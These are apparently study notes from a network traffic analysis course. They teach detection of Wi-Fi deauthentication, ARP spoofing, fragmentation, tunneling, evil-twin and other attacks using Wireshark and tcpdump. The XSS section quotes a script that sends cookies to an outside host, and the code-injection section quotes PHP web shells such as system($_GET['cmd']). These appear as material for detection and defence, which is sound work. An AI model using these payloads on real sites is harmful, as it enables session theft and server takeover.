tcpdump -i eth0 'tcp[13] &2 != 0'
```

This command checks if the SYN flag in the TCP header is set.

**Protocol RFC Links**

| **Protocol** | **RFC** |
|---|---|
| IP Protocol | [RFC 791](https://datatracker.ietf.org/doc/html/rfc791) |
| ICMP Protocol | [RFC 792](https://datatracker.ietf.org/doc/html/rfc792) |
| TCP Protocol | [RFC 793](https://datatracker.ietf.org/doc/html/rfc793) |
| UDP Protocol | [RFC 768](https://datatracker.ietf.org/doc/html/rfc768) |
| RFC Quick Links | [Wikipedia RFC Links](https://en.wikipedia.org/wiki/List_of_IP_protocol_numbers) |

#### **Traffic Analysis Workflow**

| **Task** | **Description** | **Command/Details** |
|---|---|---|
| **Connect to Live Host** | Connect to the Academy lab environment using XfreeRDP for GUI access to Wireshark. | `xfreerdp /v:<target IP> /u:htb-student /p:HTB_@cademy_stdnt!` |
| **Start Capture on Interface** | Begin capturing on interface ENS224 in Wireshark. | Open Wireshark, select interface ENS224, and start capture. |
| **Define the Issue** | Briefly summarize the issue based on baseline anomalies noticed by admin with IP 172.16.10.90. | Issue: Suspicious activity from IP 172.16.10.90 |
| **Define Scope and Goal** | Scope: Investigate unusual traffic patterns around host IP 172.16.10.90. | Scope: Check for suspicious connections, identify host actions, focus on the specific time anomaly was observed. |
| **Define Target Hosts and Network** | Define specific network addresses and protocols for focus in analysis. | Target Host: 172.16.10.90Protocols: TCP, RDP |
| **Capture or Analyze Traffic** | Perform network capture or analyze PCAP for signs of intrusion. | **Read from PCAP (if available):** `tcpdump -r guided-analysis.zip` |
| **Filter for Relevant Traffic** | Filter out baseline traffic and focus on anything unusual from 172.16.10.90 or uncommon protocols/ports. | **Filter for Host:** `tcpdump -r guided-analysis.zip host 172.16.10.90` |
| **Analyze Captured Traffic** | Dig through filtered data to find suspicious patterns, commands, or sessions (e.g., unusual ports, RDP sessions). | **Look for RDP/Netcat Indicators:** e.g., TCP port 3389, Netcat indicators |
| **Note Taking and Mapping** | Log all findings: Timeframes, hosts, ports, conversations, and specific packet numbers or files of interest. | Document packet numbers, suspicious IPs, timestamps, protocols, and any noted commands or sessions. |
| **Summarize Analysis** | Summarize findings, detailing any malicious activity, including tools (e.g., Netcat, RDP attempts). | **Summary:** Actor utilized Netcat and RDP on Bob’s host; IR response recommended to quarantine compromised host. |

#### **Wireshark Advanced Usage**

**Plugins in Wireshark**

Wireshark includes several plugins accessible through the **Statistics** and **Analyze** tabs, which provide:

- Detailed reports on network traffic, such as top talkers and specific protocol conversations.
- Tools for tracking TCP streams, filtering conversation types, creating packet filters, and accessing expert insights on network traffic.

**Using the Statistics and Analyze Tabs**

**Statistics Tab**

The **Statistics** tab offers plugins for viewing reports about:

- Protocol breakdowns
- Top IP addresses and talkers
- Conversation types and more

**Analyze Tab**

The **Analyze** tab allows users to:

- Follow and track TCP streams
- Filter by conversation types
- Prepare new packet filters
- Examine expert network diagnostics

**Following TCP Streams**

Wireshark can reconstruct TCP packet streams into readable formats, enabling data extraction (e.g., images, files).

To follow a TCP stream:

1. **Right-click** on a packet from the desired stream.
2. Select **Follow > TCP Stream**.
3. A new window opens with the entire conversation in sequence.

Alternatively, apply a filter to view a specific TCP stream:

```
tcp.stream eq #
```

Using this filter helps isolate a conversation by displaying only the relevant packets.

**Extracting Data and Files from Captures**

Wireshark can extract files from captured data streams if the entire conversation is captured. This is helpful when analyzing protocols like **FTP** (File Transfer Protocol) that transfers files between hosts.

To extract files:

1. Stop the capture.
2. Go to **File > Export** and select the desired protocol format (e.g., DICOM, HTTP, SMB).

For FTP, port 20 (data transfer) and port 21 (control commands) are used. Below are some filters to analyze FTP traffic:

**Key FTP Filters in Wireshark**

| **Filter** | **Purpose** |
|---|---|
| `ftp` | Displays all FTP traffic, helpful to identify FTP activity between hosts. |
| `ftp.request.command` | Shows FTP commands over port 21, useful for identifying commands like login, listing, download, or upload. Often reveals usernames and file names. |
| `ftp-data` | Displays data transferred over port 20, enabling file reconstruction by capturing data packets during file transfers. |

**Steps to Reconstruct FTP Data from a .pcap**

1. **Identify FTP Traffic**: Use the `ftp` display filter.
2. **Inspect FTP Commands**: Use `ftp.request.command` to see control commands, identify filenames, and check for login details.
3. **Extract Data**:
  - Use `ftp-data` to locate packets for specific file transfers.
  - Follow the TCP stream for the desired file transfer.
  - In the stream view, set **Show and save data as** to **Raw**.
  - Save the extracted content with the original filename.
4. **Verify the File Type**: Check the saved file to ensure proper extraction.

These methods provide a structured way to extract meaningful data from a network capture, offering deep insights into network activities, such as file transfers or protocol-specific interactions.

#### **Wireshark for Network Traffic Analysis**

**TShark vs. Wireshark**

TShark is a terminal-based tool with features similar to Wireshark and uses the same filters and syntax. TShark is ideal for command-line environments, while Wireshark offers a rich GUI experience.

**Basic TShark Commands**

| **Command** | **Description** |
|---|---|
| `-D` | Display available interfaces for capture |
| `-L` | List link-layer types available |
| `-i` | Select interface for capture |
| `-f` | Set packet filter in libpcap syntax |
| `-c` | Capture a set number of packets, then quit |
| `-a` | Set an autostop condition (by duration, file size, or packet count) |
| `-r` | Read from a file |
| `-W` | Write to file in pcapng format |
| `-P` | Print packet summary while writing |
| `-x` | Show hex and ASCII output |
| `-h` | Display help menu |

To view all options:

```
tshark -h
```

**Example TShark Commands**

- **Capture on an interface and save to file**:
  ```
  sudo tshark -i eth0 -w /tmp/test.pcap
  ```
- **Apply filter for specific host**:
  ```
  sudo tshark -i eth0 -f "host 172.16.146.2"
  ```

**Wireshark GUI Walkthrough**

**Three Main Panes**

1. **Packet List Pane**: Displays each packet’s summary, including order, time, source, destination, protocol, and information.
2. **Packet Details Pane**: Shows protocol details in the OSI Model format. Layers are shown in reverse order (lower to higher).
3. **Packet Bytes Pane**: Shows the packet in ASCII or hex, highlighting selected fields from the Packet Details pane.

**Capture Filters**

Capture filters, using BPF syntax, limit data written to disk. Some examples:

| **Filter** | **Description** |
|---|---|
| `host x.x.x.x` | Capture traffic for a specific host |
| `net x.x.x.x/24` | Capture traffic for a specific network |
| `port #` | Capture traffic for a specific port |
| `not port #` | Capture everything except a specific port |
| `portrange x-x` | Capture traffic within a port range |
| `broadcast` / `multicast` | Capture one-to-many or one-to-all traffic |

To view available capture filters:

1. **Capture menu** > **Capture Filters**.

**Display Filters**

Display filters can be applied to live or recorded captures and offer a wide range of protocol-based filtering options. Examples include:

| **Filter** | **Description** |
|---|---|
| `ip.addr == x.x.x.x` | Show traffic involving a specific host |
| `ip.src/dst == x.x.x.x` | Show traffic from/to a specific host |
| `dns` / `tcp` / `arp` | Filter by protocol |
| `tcp.port == x` | Filter by a specific TCP port |
| `tcp.port != x` | Exclude traffic from a specific port |
| `and` / `or` / `not` | Combine conditions |

Applying a display filter:

- Enter a filter in the **Display Filter** field in the Wireshark capture window. A valid filter turns the field green.

**Practical Note**

Filtering by protocol (like `HTTP`) may differ from filtering by port (e.g., `80`), as protocols often utilize additional identifiers like `GET` or `POST` for HTTP traffic.

**7. Intermediate Network Traffic Analysis**

#### **802.11 Denial of Service**

In traffic analysis, it's critical to scrutinize link-layer protocols. 802.11 (Wi-Fi) attacks, while sometimes overlooked, require continuous monitoring due to potential human errors that might compromise perimeter security.

---

**Capturing 802.11 Traffic**

To analyze 802.11 raw traffic, a wireless interface in **monitor mode** is required. This enables visibility into raw 802.11 frames, similar to promiscuous mode.

- **Enumerate Wireless Interfaces** (Linux): `iwconfig`
- **Enable Monitor Mode** (Option 1: `airmon-ng`):
  ```
  sudo airmon-ng start wlan0
  ```
- **Enable Monitor Mode** (Option 2: System utilities):
  ```
  sudo ifconfig wlan0 down
  sudo iwconfig wlan0 mode monitor
  sudo ifconfig wlan0 up
  ```
- **Verify Monitor Mode**:
  ```
  iwconfig
  ```

To capture traffic, specify the AP's channel (`-c`), BSSID (`--bssid`), and output file (`-w`) with `airodump-ng`:

```
sudo airodump-ng -c 4 --bssid F8:14:FE:4D:E6:F1 wlan0 -w raw
```

---

**How Deauthentication Attacks Work**

Deauthentication/dissociation attacks are common link-layer attacks, often used to:

- Capture WPA handshakes
- Disrupt service
- Force users to connect to malicious networks

Attackers typically spoof 802.11 deauthentication frames from the legitimate AP, tricking clients into disconnecting. Tools like `aireplay-ng` and `mdk4` often use **reason code 7** for deauthentication.

**Detecting Deauthentication Attacks**

Open `deauthandbadauth.cap` in Wireshark to inspect traffic from the AP's BSSID:

- **Wireshark Filter** (for AP’s BSSID):
  ```
  wlan.bssid == xx:xx:xx:xx:xx:xx
  ```
- **Filter for Deauthentication Frames**:
  ```
  (wlan.bssid == xx:xx:xx:xx:xx:xx) and (wlan.fc.type == 00) and (wlan.fc.type_subtype == 12)
  ```

If excessive deauthentication frames appear, this suggests an attack. **Reason Code 7** is often used by common attack tools. To filter for this:

```
(wlan.bssid == F8:14:FE:4D:E6:F1) and (wlan.fc.type == 00) and (wlan.fc.type_subtype == 12) and (wlan.fixed.reason_code == 7)
```

**Revolving Reason Codes**

Sophisticated attackers may vary reason codes to avoid detection:

- **Filter for Reason Code 1**:
  ```
  (wlan.bssid == F8:14:FE:4D:E6:F1) and (wlan.fc.type == 00) and (wlan.fc.type_subtype == 12) and (wlan.fixed.reason_code == 1)
  ```
- **Filter for Reason Code 2**:
  ```
  (wlan.bssid == F8:14:FE:4D:E6:F1) and (wlan.fc.type == 00) and (wlan.fc.type_subtype == 12) and (wlan.fixed.reason_code == 2)
  ```

---

**Compensating Measures**

To prevent deauthentication attacks:

- Enable **IEEE 802.11w** (Management Frame Protection)
- Use **WPA3-SAE**
- Update **WIDS/WIPS** detection rules

---

**Detecting Failed Authentication Attempts**

Excessive association requests can indicate an attack. Filter in Wireshark to capture these:

```
(wlan.bssid == F8:14:FE:4D:E6:F1) and (wlan.fc.type == 00) and (wlan.fc.type_subtype == 0) or (wlan.fc.type_subtype == 1) or (wlan.fc.type_subtype == 11)
```

#### **ARP Scanning & Denial-of-Service**

We might discern additional aberrant behaviors within the ARP requests and replies. Poisoning and spoofing are central to ARP-based denial-of-service (DoS) and man-in-the-middle (MITM) attacks, but adversaries could also leverage ARP for information gathering. Thankfully, we possess the skills to detect and evaluate these tactics following similar procedures.

---

**ARP Scanning Signs**

Typical red flags indicating ARP scanning include:

- Broadcast ARP requests sent to sequential IP addresses (.1, .2, .3, ...)
- Broadcast ARP requests sent to non-existent hosts
- Unusual volume of ARP traffic from a potentially malicious or compromised host

**Finding ARP Scanning**

By opening `ARP_Scan.pcapng` in Wireshark and applying the filter `arp.opcode`, we might observe:

- **ARP Scanning**: ARP requests propagated by a single host to all IPs sequentially, symptomatic of ARP scanning (common in scanners like Nmap).
- **Active Hosts Respond**: Detected ARP replies from live hosts indicate successful information gathering by the attacker.

---

**Identifying Denial-of-Service**

Attackers may:

1. Use ARP scanning to identify live hosts.
2. Transition to a DoS attack, contaminating the subnet by manipulating as many ARP caches as possible, or establishing a MITM position.

**ARP DoS Tactics**

- **Corrupt Router's ARP Cache**: Attack traffic focuses on declaring new physical addresses for all live IPs.
- **Duplicate IP Allocations**: The attacker assigns 192.168.10.1 to multiple clients, aiming to disrupt communication by corrupting ARP caches and obstructing traffic.

---

**Responding to ARP Attacks**

Upon identifying ARP anomalies, the following steps can be taken:

- **Tracing and Identification**: Locating the physical machine behind the attack can halt its activities. In some cases, the attacking machine may itself be compromised.
- **Containment**: Disconnect or isolate the affected area at the switch or router level to stop further data exfiltration, effectively terminating DoS or MITM attacks.

> **Note:** Link layer attacks may initially seem minor but detecting them can prevent data exfiltration from higher OSI layers.

#### **ARP Spoofing & Abnormality Detection**

**Overview**

- The Address Resolution Protocol (ARP) is frequently targeted for attacks like MITM and DoS.
- ARP attacks often use broadcast communication, aiding in detectability via packet sniffing.

**How Address Resolution Protocol Works**

1. **ARP Basics:** Hosts need the MAC address to send data, obtained through ARP requests.
2. **Process Steps:**
  - Host A checks ARP cache or broadcasts an ARP request if the IP isn’t found.
  - Host B replies with its IP-MAC mapping, updating Host A’s ARP cache.

**ARP Poisoning & Spoofing**

- **ARP Cache Poisoning:** Attackers send false ARP messages to corrupt caches, redirecting traffic.
  - **Attack Steps:**
    - Attacker sends forged ARP messages to the victim and router, altering their ARP tables.
    - If the attacker forwards traffic, they intercept and modify data, enabling MITM attacks.

**Detection & Prevention**

- **Detection Techniques:**
  - Monitor for unusual ARP traffic patterns (e.g., repetitive ARP requests).
  - Track IP-MAC inconsistencies to spot potential spoofing.
- **Prevention Controls:**
  - **Static ARP Entries**: Prevents ARP cache poisoning, though it increases maintenance.
  - **Port Security on Switches/Routers**: Blocks unauthorized devices attempting spoofing.

**Practical Detection Steps Using tcpdump and Wireshark**

1. **Install tcpdump** (if not present):
  ```
  sudo apt install tcpdump -y
  ```
2. **Capture ARP Traffic**:
  ```
  sudo tcpdump -i eth0 -w filename.pcapng
  ```
3. **Analyze with Wireshark**:
  ```
  wireshark ARP_Spoof.pcapng
  ```
  - **Wireshark Filters**:
    - Filter ARP Requests: `arp.opcode == 1`
    - Filter ARP Replies: `arp.opcode == 2`
    - Detect Duplicates: `arp.duplicate-address-detected && arp.opcode == 2`
4. **Examine IP-MAC Anomalies**:
  - Use `arp -a` on Linux to check IP-MAC mappings:
    ```
    arp -a | grep 50:eb:f6:ec:0e:7f
    arp -a | grep 08:00:27:53:0c:ba
    ```
5. **Filter in Wireshark**:
  - Track suspicious MAC interactions:
    `eth.addr == 50:eb:f6:ec:0e:7f or eth.addr == 08:00:27:53:0c:ba`

#### **Cross-Site Scripting (XSS) & Code Injection Detection**

While inspecting HTTP requests, an unusual volume of requests directed to an unknown internal "server" may indicate potential XSS activity. For example, in some cases, this behavior could involve cookies or tokens being exfiltrated, although these values may be encoded or encrypted during transit.

---

**Cross-Site Scripting (XSS)**

XSS occurs when an attacker injects malicious JavaScript or script code into a webpage, typically through user input fields. When other users load the page, their browsers execute this code, allowing attackers to steal sensitive information like cookies, tokens, and session values.

**Example of XSS Payload**

In an XSS attack, injected code might resemble the following script in a user comment section:

```
<script>
  window.addEventListener("load", function() {
    const url = "<http://192.168.0.19:5555>";
    const params = "cookie=" + encodeURIComponent(document.cookie);
    const request = new XMLHttpRequest();
    request.open("GET", url + "?" + params);
    request.send();
  });
</script>
```

If detected, remove the injected script immediately, and consider temporarily taking down the server to resolve the vulnerability.

---

**Code Injection**

Attackers may also attempt to inject malicious code into fields that interpret PHP or other executable code. This tactic allows them to gain command and control over the server.

**Examples of PHP Code Injection**

1. **Command Execution with PHP**:
  ```
  <?php system($_GET['cmd']); ?>
  ```
2. **Single Command Execution**:
  ```
  <?php echo `whoami`; ?>
  ```

If detected, these code snippets should be removed immediately, and steps taken to prevent further injections.

---

**Preventing XSS and Code Injection**

To prevent XSS and code injection attacks:

- **Sanitize User Input**: Filter and sanitize all inputs to disallow harmful scripts or commands.
- **Avoid Executing User Input as Code**: Never process or interpret user-provided input as executable code, which could enable code execution vulnerabilities.

#### **Fragmentation Attacks**

When analyzing network traffic, the IP layer is crucial for understanding packet transfers between hosts. This layer, however, lacks mechanisms to detect lost or tampered packets—these issues are managed by the transport or application layers. Key fields in the IP header include:

- **Length**: The IP header length
- **Total Length**: Entire IP packet length, including data
- **Fragment Offset**: Set when packets are fragmented, guiding reassembly at the destination
- **Source and Destination IP Addresses**: Identifying origin and target hosts

---

**Commonly Abused Fields in Fragmentation**

Attackers may manipulate these fields to evade network controls. Understanding the misuse of these fields can enhance detection during traffic analysis.

**Fragmentation Abuse Techniques**

Legitimate hosts fragment packets to transfer large data sets, following a maximum transmission unit (MTU) standard. Attackers abuse fragmentation to:

1. **IPS/IDS Evasion**: If IDS doesn’t reassemble fragments, attackers can use fragmented scans (e.g., with `nmap`) to bypass detection.
2. **Firewall Evasion**: Fragmented packets can bypass firewall controls if not reassembled before delivery.
3. **Firewall/IPS/IDS Resource Exhaustion**: Small MTU sizes (e.g., 10, 15 bytes) strain resources, possibly bypassing reassembly due to resource limits.
4. **Denial of Service**: Old hosts can be overwhelmed by large fragmented packets, causing denial-of-service.

A correctly configured network mechanism should use **delayed reassembly**—waiting for all fragments to reassemble and then performing packet inspection.

---

**Detecting Fragment Offset Irregularities**

To inspect fragmentation anomalies, open the capture file in Wireshark:

```
wireshark nmap_frag_fw_bypass.pcapng
```

**Indicators of Fragmented Scans**

1. **ICMP Requests**: Nmap or similar scans often start with ICMP requests for host discovery.
  ```
  nmap <host ip>
  ```
2. **Fragmented Packets with Specified MTU**: Attackers set a specific MTU to fragment packets.
  ```
  nmap -f 10 <host ip>
  ```
  - Packets with repeated fragmentation from a host indicate a possible fragmentation attack.
3. **One Host, Multiple Ports Pattern**: Fragmented scans generate responses with **RST flags** for closed ports, indicating scans across many ports.

---

**Configuring Wireshark for Reassembly**

If Wireshark isn’t reassembling packets automatically, adjust settings under **Preferences** for the IPv4 protocol to ensure packet reassembly, facilitating more accurate inspection.

#### **HTTP & HTTPs Service Enumeration**

Often, unusual HTTP/HTTPS traffic patterns indicate potential attacks on web servers. Attackers may exploit transport layer vulnerabilities to gather information, explore, or exploit web applications.

---

**Detecting Fuzzing Attempts**

Fuzzing attempts can be identified through:

- **Excessive HTTP/HTTPS traffic** from a single host.
- Checking web server **access logs** for repetitive or unusual access attempts.

Attackers often initiate fuzzing to discover server details before an attack. Web Application Firewalls (WAFs) may block such activity, though internal servers may be more vulnerable.

---

**Finding Directory Fuzzing**

Directory fuzzing allows attackers to probe for web pages and directories. This can be detected in traffic analysis by filtering for `http` traffic in Wireshark.

1. **Basic Filter**:
  ```
  http
  ```
2. **Isolating Requests**: To exclude server responses, specify `http.request`.

**Indicators of Directory Fuzzing**

- **Repeated 404 Responses**: Frequent attempts to access non-existent files.
- **Rapid Request Sequences**: Multiple requests sent quickly.

**Checking Access Logs**

On an Apache server, use the following commands to filter logs by IP address.

- **Using**`grep`:
  ```
  cat access.log | grep "192.168.10.5"
  ```
- **Using**`awk`:
  ```
  cat access.log | awk '$1 == "192.168.10.5"'
  ```

Example log entries:

```
192.168.10.5 - - [18/Jul/2023:12:58:07 -0600] "GET /randomfile1 HTTP/1.1" 404 435 "-" "Mozilla/4.0"
192.168.10.5 - - [18/Jul/2023:12:58:07 -0600] "GET /.bash_history HTTP/1.1" 404 435 "-" "Mozilla/4.0"
...
```

---

**Detecting Other Fuzzing Techniques**

Attackers may target dynamic or static webpage elements, like `id` fields, or test for IDOR vulnerabilities, especially with JSON parsing.

- **Filtering Specific Hosts**:
  ```
  http.request and ((ip.src_host == <suspected IP>) or (ip.dst_host == <suspected IP>))
  ```

To examine the entire request sequence:

- Right-click any request and select **Follow > HTTP Stream** in Wireshark.

**Indicators of Fuzzing Attempts**:

- Rapid request patterns suggest fuzzing.
- Advanced attackers may stagger requests over time or distribute them across multiple IPs to evade detection.

---

**Preventing Fuzzing Attempts**

To counteract fuzzing:

- **Adjust Server Configurations**: Configure `virtualhost` or access settings to return correct response codes.
- **Use WAF Rules**: Block specific IPs or patterns of suspicious behavior to protect the server.

#### **ICMP Tunneling**

Tunneling is a method used by attackers to exfiltrate data from one system to another. Different protocols are used for tunneling, often exploiting proxies or trusted protocols allowed by network controls.

---

**Basics of Tunneling**

When attackers need to send data to an external host, they may employ tunneling, often establishing command and control over a compromised machine. Tunneling can occur over protocols like SSH, HTTP, HTTPS, DNS, and ICMP, each enabling attackers to bypass network security measures.

---

**ICMP Tunneling**

In ICMP tunneling, attackers embed data into the data field of ICMP requests to conceal it within normal network traffic.

**Detecting ICMP Tunneling**

Since ICMP tunneling involves placing data in the ICMP data field, it can be detected by examining data sizes in ICMP requests and replies.

1. **ICMP Filter**: Use the ICMP filter in Wireshark to view ICMP-specific traffic.
2. **Detecting Large Data Transfers**: Fragmented ICMP traffic or unusually large data fields (e.g., over 48 bytes) may indicate tunneling. Normal ICMP requests have smaller data fields, typically around 48 bytes, whereas tunneling traffic can show lengths up to 38,000 bytes.
3. **Inspecting Data Contents**: In Wireshark, examine the data field in ICMP requests for sensitive information (e.g., usernames and passwords). This is a direct sign of ICMP tunneling.
4. **Encoded Data**: Advanced attackers may encode or encrypt exfiltrated data within ICMP packets. Detecting encoded data might require manual decoding, as shown:
  ```
  echo 'VGhpcyBpcyBhIHNlY3VyZSBrZXk6IEtleTEyMzQ1Njc4OQo=' | base64 -d
  ```

If ICMP data lengths exceed typical sizes (e.g., 48 bytes), further analysis is warranted.

---

**Preventing ICMP Tunneling**

- **Block ICMP Requests**: Disabling ICMP can prevent tunneling, though it may affect legitimate network diagnostics.
- **Inspect ICMP Requests and Replies**: By monitoring and analyzing ICMP traffic, especially data fields, suspicious tunneling activity can be detected and mitigated.

#### **IP Source & Destination Spoofing Attacks**

There are cases where irregular IPv4 and IPv6 traffic might arise from manipulation of source and destination IP fields. Key points to consider in traffic analysis include:

- **Source IP for Incoming Traffic**: Should always be from within our subnet. An external source IP suggests possible packet crafting.
- **Source IP for Outgoing Traffic**: Should also be within our subnet. An unusual IP range may indicate malicious traffic from within the network.

---

**Attack Methods Involving IP Spoofing**

Attackers may craft source and destination IP fields for various purposes:

1. **Decoy Scanning**: Changes source IP to bypass firewall restrictions, posing as a host in the target’s subnet to evade detection.
2. **Random Source Attack (DDoS)**: Sends high volumes of traffic from randomized source IPs to exhaust resources on the destination host.
3. **LAND Attacks**: Spoofs the source IP to match the destination, causing resource exhaustion or crashes on the target host.
4. **SMURF Attacks**: Sends ICMP packets to multiple hosts with the victim's IP as the source, flooding the victim with replies.
5. **Initialization Vector Generation**: In older WEP networks, repeated packet injection with crafted IPs can build decryption tables for statistical attacks.

These attacks typically derive from IP layer manipulation, rather than ARP poisoning, though both methods are often combined.

---

**Detecting Decoy Scanning Attempts**

An attacker may alter their source IP to mimic a legitimate host, aiming to bypass IDS/Firewall controls. Indicators of decoy scanning include:

- **Initial Fragmentation** from a spoofed address
- **TCP Traffic** from the legitimate source address with RST flags for closed ports

Detection techniques:

- **Packet Reassembly**: Ensure IDS/IPS/Firewall systems can reconstruct packets, mimicking destination host behavior.
- **Connection Consistency**: Watch for connections initiated by one host and completed by another, indicating address cloaking.

---

**Detecting Random Source Attacks**

Random source attacks can target a specific service by flooding it with traffic from varied source addresses. Indicators include:

- **Single Port Utilization**: Traffic from multiple random hosts targeting a single port.
- **Incremental Base Port**: Consistent base ports with minimal randomization.
- **Identical Length Fields**: In contrast to legitimate user traffic, crafted packets may have uniform lengths.

---

**Detecting SMURF Attacks**

SMURF attacks leverage ICMP packets with the victim’s IP as the source, prompting responses that overwhelm the victim. Attack steps:

1. **ICMP Request** to live hosts with the victim’s IP as the source.
2. **ICMP Reply** from live hosts to the victim, exhausting its resources.

**Detection**: Excessive ICMP replies to a single host. Attackers may add fragmentation or extra data to amplify the attack volume.

---

**Detecting LAND Attacks**

LAND attacks spoof the source IP to match the destination IP, using high traffic volume and port re-use to disrupt service. This congestion makes genuine connections difficult to establish with the targeted host.

#### **IP Time-to-Live Attacks.**

Time-to-Live (TTL) attacks are used by attackers as an evasion technique. By setting a low TTL, attackers aim to bypass firewall, IDS, and IPS detection. This process works as follows:

---

**TTL Manipulation**

1. **Crafting Low TTL Packets**: Attackers set a low TTL (e.g., 1, 2, 3).
2. **TTL Decrement**: As packets traverse each hop, the TTL decreases by one.
3. **Packet Discard**: When TTL reaches zero, the packet is discarded, ideally before reaching a firewall or filter.
4. **ICMP Response**: Expired packets trigger ICMP Time Exceeded messages from routers along the path, sent back to the source.

---

**Detecting IP TTL Irregularities**

To detect TTL manipulation, capture and analyze traffic in Wireshark. While single instances are hard to spot, attackers often use TTL manipulation during port scans, generating noticeable patterns.

**Indicators in TTL Manipulation**

1. **SYN, ACK from Service Ports**: A legitimate SYN, ACK response from a host’s service port may indicate a bypassed firewall.
2. **Low TTL Values**: Opening the IPv4 tab in Wireshark for suspicious packets may reveal unusually low TTL values.

**Mitigation Strategy**

Implement a control that filters or discards packets with TTLs below a threshold. This helps prevent IP packet crafting attacks that exploit TTL manipulation.

#### **Peculiar DNS Traffic.**

DNS traffic analysis can be challenging due to its high volume, but identifying abnormalities is crucial for detecting malicious activity.

---

**DNS Queries**

DNS queries allow clients to resolve domain names to IP addresses and vice versa.

**DNS Forward Queries**

In a forward lookup, the client resolves a domain name to an IP address, following these steps:

1. **Query Initiation**: Client queries domain, e.g., `academy.hackthebox.com`.
2. **Local Cache Check**: Checks local DNS cache; if unresolved, continues.
3. **Recursive Query**: Sends query to the configured DNS server.
4. **Root Servers**: DNS resolver queries root servers if necessary.
5. **TLD Servers**: Root server directs to TLD servers (e.g., `.com`).
6. **Authoritative Servers**: TLD server points to domain's authoritative server.
7. **Domain’s Authoritative Servers**: The resolver obtains the IP address.
8. **Response**: The IP address is sent back to the client.

**DNS Reverse Lookups/Queries**

Reverse lookups are used to find a domain name from an IP address:

1. **Query Initiation**: Client sends a DNS reverse query with the IP.
2. **Reverse Lookup Zones**: DNS resolver checks if it is authoritative.
3. **PTR Record Query**: Resolver searches for a PTR record.
4. **Response**: The FQDN is returned if a matching PTR is found.

---

**DNS Record Types**

| **Record Type** | **Description** |
|---|---|
| A | Maps a domain name to an IPv4 address |
| AAAA | Maps a domain name to an IPv6 address |
| CNAME | Creates an alias for a domain |
| MX | Specifies mail server for the domain |
| NS | Authoritative name servers for the domain |
| PTR | Used in reverse queries to map IP to a domain |
| TXT | Specifies text associated with the domain |
| SOA | Administrative information about the zone |

---

**Detecting DNS Enumeration Attempts**

A high volume of DNS queries from a single host may suggest DNS enumeration. Using Wireshark, filter DNS traffic as follows:

```
dns
```

If queries include `ANY`, this could indicate DNS enumeration, or even subdomain enumeration.

---

**Finding DNS Tunneling**

DNS tunneling can involve a significant number of **TXT records** from one host. Attackers may exfiltrate data by appending it to the TXT field of DNS queries.

**Example of DNS Tunneling Indicators**

Examine DNS traffic for unusual or unexpected text in the TXT field. Encoded or encrypted data may appear, often as base64:

1. **Extracting Base64 Encoded Data**:
  ```
  echo 'VTBaU1EyVXhaSFprVjNocldETnNkbVJXT1cxaU0wb3pXVmhLYTFneU1XeFlNMUp2WVZoT1ptTklTbXhrU0ZJMVdETkNjMXBYUm5wYQpXREJMQ2c9PQo=' | base64 -d
  ```
2. **Handling Multi-Level Encoding**:
  ```
  echo 'encoded_string' | base64 -d | base64 -d | base64 -d
  ```
  Some attackers may encode data multiple times or encrypt it, making detection harder.

---

**Reasons for DNS Tunneling**

1. **Data Exfiltration**: Used to covertly export data from a network.
2. **Command and Control**: Enables compromised systems to communicate with attacker-controlled servers, often used in botnets.
3. **Firewall Bypassing**: DNS tunnels can bypass firewalls or proxies focused on HTTP/HTTPS.
4. **Domain Generation Algorithms (DGAs)**: Advanced malware uses DGAs to generate dynamic domain names, complicating detection.

---

**The Interplanetary File System and DNS Tunneling**

Advanced threat actors may use IPFS to store and retrieve malicious files, making DNS/HTTP traffic to URIs like the following noteworthy:

- **IPFS Example URI**:
  ```
  <https://cloudflare-ipfs.com/ipfs/QmS6eyoGjENZTMxM7UdqBk6Z3U3TZPAVeJXdgp9VK4o1Sz>
  ```

IPFS operates on a peer-to-peer basis, complicating detection. Regular monitoring of DNS and HTTP/HTTPS traffic is essential to mitigate these attacks.

#### **Rogue Access Point & Evil-Twin Attacks**

**Rogue Access Point (AP)**

A rogue AP is an unauthorized device connected directly to the network, potentially bypassing perimeter controls. These APs may:

- Circumvent network segmentation
- Provide unauthorized access to restricted sections of a network
- Occasionally, infiltrate air-gapped networks

---

**Evil-Twin**

An evil-twin AP is usually a standalone access point, separate from the network, often used by attackers to intercept data via man-in-the-middle (MITM) attacks. Such APs:

- Are commonly set up to capture wireless credentials and other sensitive information
- Might host hostile portals to lure users into disclosing credentials

---

**Detection with Airodump-ng**

We can utilize `airodump-ng` with an ESSID filter to detect Evil-Twin APs:

```
sudo airodump-ng -c 4 --essid HTB-Wireless wlan0 -w raw
```

Example output:

```
CH  4 ][ Elapsed: 1 min ][ 2023-07-13 16:06
BSSID              PWR RXQ  Beacons    #Data, #/s  CH   MB   ENC CIPHER  AUTH ESSID
F8:14:FE:4D:E6:F2   -7 100      470      155    0   4   54   OPN              HTB-Wireless
F8:14:FE:4D:E6:F1   -5  96      682        0    0   4  324   WPA2 CCMP   PSK  HTB-Wireless
```

The example shows an attacker-created open AP with an identical ESSID to our legitimate AP, suggesting a hostile portal attack.

---

**Beacon Analysis for Evil-Twin Detection**

To confirm anomalies, examine beacon frames with this Wireshark filter:

```
(wlan.fc.type == 00) and (wlan.fc.type_subtype == 8)
```

**Beacon Analysis**:

- **RSN Information**: The legitimate AP’s RSN info may indicate WPA2 with AES/TKIP and PSK. In contrast, a malicious AP might lack RSN information.
- **Additional Fields**: For sophisticated attacks, check vendor-specific info and other unique identifiers that might be missing in the attacker’s AP.

---

**Identifying Compromised Users**

In cases of open-network evil-twin attacks:

- Use the following Wireshark filter to isolate traffic for the suspicious AP:
  ```
  (wlan.bssid == F8:14:FE:4D:E6:F2)
  ```

Detecting ARP requests from a client device on this network could indicate a potential compromise. Record:

- Client device’s MAC address
- Host name

Take responsive actions like password resets to mitigate risk.

---

**Detecting Rogue Access Points**

Rogue AP detection often involves network device monitoring. Look for:

- Unrecognized networks with strong signals, especially open networks
- Potential hotspots in close proximity (e.g., Windows hotspots)

Unfamiliar networks without encryption may indicate rogue access points set up to bypass network security.

#### **SSL Renegotiation Attacks**

While analyzing encrypted HTTPS traffic, it's essential to understand HTTPS protocol indicators that may reveal SSL/TLS-based attacks. HTTPS relies on encryption protocols, specifically:

- **Transport Layer Security (TLS)**
- **Secure Sockets Layer (SSL)**

---

**HTTPS Connection Process**

1. **Handshake**: Server and client establish a connection, agreeing on encryption algorithms and exchanging certificates.
2. **Encryption**: Following the handshake, the connection is encrypted with the selected algorithm.
3. **Data Exchange**: Encrypted data (web pages, images, etc.) is exchanged between client and server.
4. **Decryption**: Both sides decrypt data using their private and public keys.

